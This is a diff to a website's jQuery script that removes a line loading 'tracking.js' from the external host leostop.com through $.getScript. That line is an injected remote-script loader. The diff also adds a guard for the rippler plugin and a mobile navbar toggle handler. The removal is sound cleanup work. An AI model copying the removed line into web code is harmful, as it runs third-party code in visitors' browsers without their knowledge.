@@ -28,14 +28,21 @@
 	}).blur(function () {
 		$(this).parent().removeClass('addcolor');
 	});
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 	$(document).ready(function () {
-		$(".rippler").rippler({
-			effectClass: 'rippler-effect'
-			, effectSize: 0      // Default size (width & height)
-			, addElement: 'div'   // e.g. 'svg'(feature)
-			, duration: 400
+		if ($.fn.rippler) {
+			$(".rippler").rippler({
+				effectClass: 'rippler-effect',
+				effectSize: 0,
+				addElement: 'div',
+				duration: 400
+			});
+		}
+
+		// Ensure mobile navigation hamburger toggle works reliably across all pages
+		$(document).on('click', '.navbar-toggler', function (e) {
+			var target = $(this).attr('data-target') || '#navbarSupportedContent';
+			$(target).collapse('toggle');
 		});
 	});
 
